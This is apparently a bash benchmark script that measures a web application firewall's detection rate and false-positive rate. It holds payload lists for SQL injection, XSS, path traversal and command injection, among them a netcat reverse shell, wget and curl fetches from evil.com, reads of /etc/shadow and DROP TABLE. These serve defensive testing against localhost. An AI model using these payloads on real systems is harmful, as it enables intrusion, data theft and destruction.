#!/usr/bin/env bash
# =============================================================================
# SHIBUYA WAF — Detection Accuracy Benchmark
# Tests SQLi, XSS, Path Traversal payloads and measures detection rate.
# Also tests false-positive rate with legitimate traffic.
# Usage: benchmarks/detection_test.sh --http-port 8080 --output results.csv
# =============================================================================
set -euo pipefail

# ── Defaults ─────────────────────────────────────────────────────────────────
HTTP_PORT="8080"
ADMIN_PORT="9090"
OUTPUT_FILE="detection_results.csv"

while [[ $# -gt 0 ]]; do
  case "$1" in
    --http-port)   HTTP_PORT="$2";   shift 2 ;;
    --admin-port)  ADMIN_PORT="$2";  shift 2 ;;
    --output)      OUTPUT_FILE="$2"; shift 2 ;;
    *) shift ;;
  esac
done

BASE="http://localhost:${HTTP_PORT}"
ADMIN="http://localhost:${ADMIN_PORT}"

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; NC='\033[0m'
log() { echo -e "[DETECT] $*"; }
pass() { echo -e "${GREEN}[PASS]${NC} $*"; }
warn_msg() { echo -e "${YELLOW}[WARN]${NC} $*"; }

# ── SQLi Payloads ────────────────────────────────────────────────────────────
SQLI_PAYLOADS=(
  "1' OR '1'='1"
  "1 OR 1=1--"
  "admin'--"
  "' or '1'='1'/*"
  "1' WAITFOR DELAY '00:00:05'--"
  "1' AND SLEEP(5)--"
  "1' UNION SELECT NULL,NULL,NULL,NULL,NULL--"
  "1' AND 1=0 UNION ALL SELECT NULL,NULL--"
  "1; DROP TABLE users--"
  "1' OR '1'='1' /*"
  "' UNION SELECT username,password FROM users--"
  "1; EXEC xp_cmdshell('whoami')--"
  "1' OR 'x'='x"
  "1') OR ('1'='1"
  "1' AND (SELECT COUNT(*) FROM users) > 0--"
  "' OR 1=1 LIMIT 1--"
  "1 UNION ALL SELECT 1,2,3--"
  "admin' AND '1'='1"
  "' OR ''='"
  "1' ORDER BY 10--"
)

# ── URL-Encoded SQLi ────────────────────────────────────────────────────────
SQLI_ENCODED=(
  "1%27%20OR%20%271%27%3D%271"
  "1%27%20UNION%20SELECT%20NULL--"
  "%27%20OR%20%27x%27%3D%27x"
  "1%27%3B%20DROP%20TABLE%20users--"
  "1%2527%2520OR%25201%253D1--"
)

# ── XSS Payloads ────────────────────────────────────────────────────────────
XSS_PAYLOADS=(
  "<script>alert(1)</script>"
  "<img src=x onerror=alert(1)>"
  "<svg onload=alert(1)>"
  "javascript:alert(1)"
  '<iframe src="javascript:alert(1)">'
  "<body onload=alert(1)>"
  "<input onfocus=alert(1) autofocus>"
  "<ScRiPt>alert(1)</sCrIpT>"
  "<img src=x onerror=prompt(1)>"
  "<details open ontoggle=alert(1)>"
  "'\"><img src=x onerror=alert(1)>"
  "<svg/onload=alert(1)>"
  "<math><mi//xlink:href='data:x,<script>alert(1)</script>'>"
  "<a href=javascript:alert(1)>click</a>"
  "<marquee onstart=alert(1)>"
)

# ── URL-Encoded XSS ─────────────────────────────────────────────────────────
XSS_ENCODED=(
  "%3Cscript%3Ealert(1)%3C/script%3E"
  "%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E"
  "&lt;script&gt;alert(1)&lt;/script&gt;"
  "%253Cscript%253Ealert(1)%253C%252Fscript%253E"
)

# ── Path Traversal ───────────────────────────────────────────────────────────
PATH_TRAV_PAYLOADS=(
  "../../etc/passwd"
  "....//....//etc/passwd"
  "..%2F..%2Fetc%2Fpasswd"
  "..\\..\\etc\\passwd"
  "/etc/passwd%00.jpg"
  "..%252f..%252f..%252fetc%252fpasswd"
  "/....//....//....//etc/passwd"
  "..%c0%af..%c0%af..%c0%afetc/passwd"
  "\\..\\..\\..\\etc\\passwd"
  "%2e%2e%2f%2e%2e%2fetc%2fpasswd"
)

# ── RCE Payloads ─────────────────────────────────────────────────────────────
RCE_PAYLOADS=(
  "; ls -la"
  "| cat /etc/passwd"
  "\$(whoami)"
  "\`id\`"
  "; nc -e /bin/sh 10.0.0.1 4444"
  "| wget http://evil.com/shell.sh"
  "; curl http://evil.com/payload"
  "& ping -c 5 evil.com"
  "\$(sleep 10)"
  "|| cat /etc/shadow"
)

# ── Legitimate (False Positive) Requests ─────────────────────────────────────
LEGIT_PATHS=(
  "/api/users"
  "/api/products?category=electronics&price=100"
  "/api/search?q=hello+world"
  "/api/search?q=machine+learning+tutorial"
  "/api/search?q=best+restaurants+near+me"
  "/api/orders/12345"
  "/api/settings"
  "/assets/logo.png"
  "/api/dashboard"
  "/api/profile"
  "/api/notifications"
  "/api/users?page=2&limit=20"
  "/api/products?sort=price_asc&brand=Samsung"
  "/api/search?q=python programming"
  "/api/health"
  "/api/docs"
  "/api/v2/users"
  "/api/search?q=O'Reilly+Media"
  "/api/search?q=50%25+off+sale"
  "/api/products?name=Dell+XPS+15"
)

LEGIT_POST_BODIES=(
  '{"username":"testuser","password":"MyP@ssw0rd123"}'
  '{"email":"user@example.com","name":"John Doe"}'
  '{"query":"SELECT * FROM products WHERE price > 50","note":"this is a legit field named query"}'
  '{"action":"create","data":{"title":"My Article","body":"This is a test article with normal content."}}'
  '{"filters":{"category":"books","minPrice":10,"maxPrice":100}}'
  '{"search":"best coffee shops in Tokyo"}'
  '{"items":[{"id":1,"quantity":2},{"id":5,"quantity":1}]}'
  '{"feedback":"Great product! Would buy again. 5/5 stars."}'
  '{"settings":{"theme":"dark","language":"en","notifications":true}}'
  '{"comment":"I love this! The interface is clean and intuitive."}'
)

# ── Test runner ──────────────────────────────────────────────────────────────
send_get() {
  local url="$1"
  local code
  code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 "$url" 2>/dev/null || echo "000")
  echo "$code"
}

send_post() {
  local url="$1"
  local body="$2"
  local code
  code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 \
    -X POST -H "Content-Type: application/json" -d "$body" "$url" 2>/dev/null || echo "000")
  echo "$code"
}

is_blocked() {
  local status="$1"
  [[ "$status" == "403" || "$status" == "406" || "$status" == "418" || "$status" == "400" ]]
}

# ── Run tests ────────────────────────────────────────────────────────────────
log "Starting detection accuracy test against $BASE"
log "─────────────────────────────────────────────────"

# Initialize CSV
echo "payload_type,total,detected,bypassed,detection_rate" > "$OUTPUT_FILE"

# Detailed log
DETAIL_FILE="${OUTPUT_FILE%.csv}_detail.csv"
echo "type,payload,status,blocked" > "$DETAIL_FILE"

run_attack_suite() {
  local type_name="$1"
  shift
  local payloads=("$@")
  local total=${#payloads[@]}
  local detected=0
  local bypassed=0

  log "Testing $type_name ($total payloads)..."

  for payload in "${payloads[@]}"; do
    local encoded
    encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''${payload}''', safe=''))" 2>/dev/null || echo "$payload")
    local status
    status=$(send_get "${BASE}/api/search?q=${encoded}")

    if is_blocked "$status"; then
      detected=$((detected + 1))
      echo "${type_name},\"${payload}\",${status},true" >> "$DETAIL_FILE"
    else
      bypassed=$((bypassed + 1))
      echo "${type_name},\"${payload}\",${status},false" >> "$DETAIL_FILE"
      warn_msg "BYPASS: [$type_name] status=$status payload='${payload:0:60}'"
    fi
  done

  local rate=0
  if (( total > 0 )); then
    rate=$(python3 -c "print(round(${detected}/${total}*100,1))")
  fi

  echo "${type_name},${total},${detected},${bypassed},${rate}" >> "$OUTPUT_FILE"
  if (( bypassed == 0 )); then
    pass "$type_name: ${rate}% (${detected}/${total})"
  else
    warn_msg "$type_name: ${rate}% (${detected}/${total}, ${bypassed} bypassed)"
  fi
}

# Attack suites
run_attack_suite "sqli"           "${SQLI_PAYLOADS[@]}"
run_attack_suite "sqli_encoded"   "${SQLI_ENCODED[@]}"
run_attack_suite "xss"            "${XSS_PAYLOADS[@]}"
run_attack_suite "xss_encoded"    "${XSS_ENCODED[@]}"
run_attack_suite "path_traversal" "${PATH_TRAV_PAYLOADS[@]}"
run_attack_suite "rce"            "${RCE_PAYLOADS[@]}"

# ── False Positive Test (Legitimate Traffic) ─────────────────────────────────
log "─────────────────────────────────────────────────"
log "Testing false positives with legitimate traffic..."

fp_total=0
fp_blocked=0

# GET requests
for path in "${LEGIT_PATHS[@]}"; do
  fp_total=$((fp_total + 1))
  status=$(send_get "${BASE}${path}")
  if is_blocked "$status"; then
    fp_blocked=$((fp_blocked + 1))
    warn_msg "FALSE POSITIVE: GET $path → $status"
    echo "legit_get,\"${path}\",${status},true" >> "$DETAIL_FILE"
  else
    echo "legit_get,\"${path}\",${status},false" >> "$DETAIL_FILE"
  fi
done

# POST requests
for body in "${LEGIT_POST_BODIES[@]}"; do
  fp_total=$((fp_total + 1))
  status=$(send_post "${BASE}/api/data" "$body")
  if is_blocked "$status"; then
    fp_blocked=$((fp_blocked + 1))
    warn_msg "FALSE POSITIVE: POST body → $status"
    echo "legit_post,\"${body:0:40}\",${status},true" >> "$DETAIL_FILE"
  else
    echo "legit_post,\"${body:0:40}\",${status},false" >> "$DETAIL_FILE"
  fi
done

fp_allowed=$((fp_total - fp_blocked))
fp_rate=0
if (( fp_total > 0 )); then
  fp_rate=$(python3 -c "print(round(${fp_blocked}/${fp_total}*100,1))")
fi

echo "false_positive,${fp_total},${fp_blocked},${fp_allowed},${fp_rate}" >> "$OUTPUT_FILE"

if (( fp_blocked == 0 )); then
  pass "False positives: ${fp_rate}% (${fp_blocked}/${fp_total}) — PERFECT"
else
  warn_msg "False positives: ${fp_rate}% (${fp_blocked}/${fp_total})"
fi

# ── Summary ──────────────────────────────────────────────────────────────────
echo ""
log "═════════════════════════════════════════════════"
log "Detection Test Summary"
log "═════════════════════════════════════════════════"
column -t -s',' "$OUTPUT_FILE"
log "═════════════════════════════════════════════════"
log "Detail log: $DETAIL_FILE"
log "Results CSV: $OUTPUT_FILE"
